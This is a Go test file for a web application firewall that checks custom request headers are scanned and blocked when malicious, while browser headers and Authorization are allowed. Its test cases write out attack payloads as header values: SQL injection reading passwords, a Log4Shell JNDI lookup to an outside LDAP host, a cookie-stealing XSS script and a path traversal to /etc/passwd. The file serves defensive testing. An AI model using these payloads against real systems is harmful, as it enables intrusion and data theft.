package main

import (
	"bufio"
	"net/http"
	"strings"
	"testing"

	"secure-proxy-waf/internal/engine"
	"secure-proxy-waf/internal/inspect"
)

// Every request header is scanned but the framing ones and the credentials:
// a payload in a custom header is blocked like one in the query, and a
// browser's own headers (client hints, fetch metadata, Next.js router state)
// are not an attack.
func TestEveryRequestHeaderIsInspected(t *testing.T) {
	withEngine(t, engine.Config{BlockThreshold: 10})
	verdict := func(extra, ip string) verdict {
		raw := "GET http://shop.example/item?id=7 HTTP/1.1\r\nHost: shop.example\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n" + extra + "\r\n"
		r, err := http.ReadRequest(bufio.NewReader(strings.NewReader(raw)))
		if err != nil {
			t.Fatal(err)
		}
		return runReqmod(t, r, ip)
	}
	for i, h := range []string{
		"X-Data: 1' UNION SELECT password FROM users--\r\n",
		"X-Api-Version: ${jndi:ldap://203.0.113.9/a}\r\n",
		"Origin: <script>alert(document.cookie)</script>\r\n",
		"X-Original-Url: ../../../../etc/passwd\r\n",
	} {
		if v := verdict(h, "198.51.100."+itoa(170+i)); v.Action != "block" {
			t.Errorf("%q: %s, want block", strings.TrimSpace(h), v)
		}
	}
	for i, h := range []string{
		"Sec-Ch-Ua: \"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"\r\nSec-Ch-Ua-Mobile: ?0\r\nSec-Ch-Ua-Platform: \"macOS\"\r\n",
		"Sec-Fetch-Dest: empty\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Site: same-origin\r\nOrigin: https://shop.example\r\n",
		"Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D\r\nRsc: 1\r\n",
		"Range: bytes=0-1023\r\nIf-None-Match: \"5f1a2b3c\"\r\nCache-Control: no-cache\r\n",
		// Credentials are not scanned: a match excerpt must not copy a token.
		"Authorization: Bearer 1' OR '1'='1\r\n",
	} {
		if v := verdict(h, "198.51.100."+itoa(180+i)); v.Action != "allow" {
			t.Errorf("%q: %s, want allow", strings.TrimSpace(h), v)
		}
	}
}

// The scanned text is in header name order whatever order the request used,
// so two runs over the same request match the same way.
func TestInspectedHeaderTextIsOrdered(t *testing.T) {
	a := http.Header{"X-B": {"two"}, "Accept": {"one"}, "Authorization": {"secret"}, "Content-Length": {"3"}}
	b := http.Header{"Content-Length": {"3"}, "Authorization": {"secret"}, "Accept": {"one"}, "X-B": {"two"}}
	ta, na := inspect.InspectedHeaderText(a)
	tb, nb := inspect.InspectedHeaderText(b)
	if ta != tb || na != nb || ta != " one two" || na != 2 {
		t.Errorf("got %q/%d and %q/%d, want \" one two\"/2 for both", ta, na, tb, nb)
	}
}
